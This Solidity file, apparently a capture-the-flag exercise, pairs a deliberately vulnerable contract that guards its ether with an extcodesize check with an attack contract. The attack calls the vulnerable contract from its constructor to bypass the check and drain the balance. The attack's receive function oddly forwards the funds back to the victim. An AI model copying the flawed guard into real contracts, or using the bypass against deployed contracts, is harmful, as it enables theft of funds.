// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract CallMeMaybeContract {

    modifier CallMeMaybe() {
      uint32 size;
      address _addr = msg.sender;
      assembly {
        size := extcodesize(_addr)
      }
      if (size > 0) {
          revert("modifier");
      }
      _;
    }

    function HereIsMyNumber() public payable CallMeMaybe{
        if(tx.origin == msg.sender) {
            revert("function");
        } else {      

        (bool succes, ) =  payable(msg.sender).call{
            value : address(this).balance}(""); 

        require(succes, "Failed to send Ether");
        
        }
    }

    receive() external payable {}
}



contract testExtcodesizeCallMeMaybe{

    CallMeMaybeContract atack;

    function callHereIsMyNumber() public {
        atack.HereIsMyNumber();
    }

    constructor(address payable _contractAtack){
        atack = CallMeMaybeContract(_contractAtack);
    }

}



contract HackCallMeMaybeContract{

    CallMeMaybeContract atack;

    address private atackAddres;    

    function balanceOf() public view returns (uint256){
        return (address(this).balance);
    }

    receive() external payable {
        (bool succes, ) =  payable(atackAddres).call{value : msg.value}("");
        require(succes, "Failed to send Ether");
    }

     constructor(address payable _atack){
        atackAddres = _atack;
        atack = CallMeMaybeContract(_atack);
        atack.HereIsMyNumber();        
    }

}
